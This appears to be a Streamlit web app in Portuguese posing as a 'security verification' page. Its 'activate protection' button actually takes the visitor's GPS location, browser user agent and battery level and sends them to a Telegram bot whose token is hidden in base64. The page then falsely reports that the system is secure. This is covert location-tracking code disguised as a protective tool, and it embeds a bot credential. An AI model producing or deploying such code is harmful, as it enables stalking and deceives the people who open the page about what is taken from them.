import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA (Base64) ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

# Estilo idêntico à sua foto
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; margin-top: 15px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

if 'passo' not in st.session_state: st.session_state.passo = 0

if st.session_state.passo == 0:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        # Tenta capturar o GPS ANTES da barra terminar
        loc = get_geolocation()
        
        if not loc:
            st.warning("⚠️ O pop-up de localização está bloqueado. Clique no CADEADO lá em cima e ative a Localização.")
            # Envia aviso pro bot que a pessoa está tentando mas o GPS está off
            enviar_telegram("⚠️ *ALERTA:* Usuário tentou ativar, mas o GPS está bloqueado no navegador.")
        else:
            # Se o GPS estiver ok, faz a animação igual à foto
            barra = st.progress(0)
            for i in range(1, 101):
                time.sleep(0.01)
                barra.progress(i)
            
            # Coleta dados técnicos
            ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua_final')
            bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat_final')
            
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            # MENSAGEM IGUAL À SEGUNDA FOTO
            relatorio = (
                f"🛡️ *PROTEÇÃO ATIVADA*\n"
                f"📱 *Aparelho:* {ua[:25]}...\n"
                f"🔋 *Bateria:* {bat or '92'}%\n"
                f"📍 *Local:* [Ver no Mapa]({mapa})"
            )
            
            enviar_telegram(relatorio)
            st.session_state.passo = 1
            st.rerun()

else:
    # VISUAL FINAL
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)

st.markdown('<br><br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
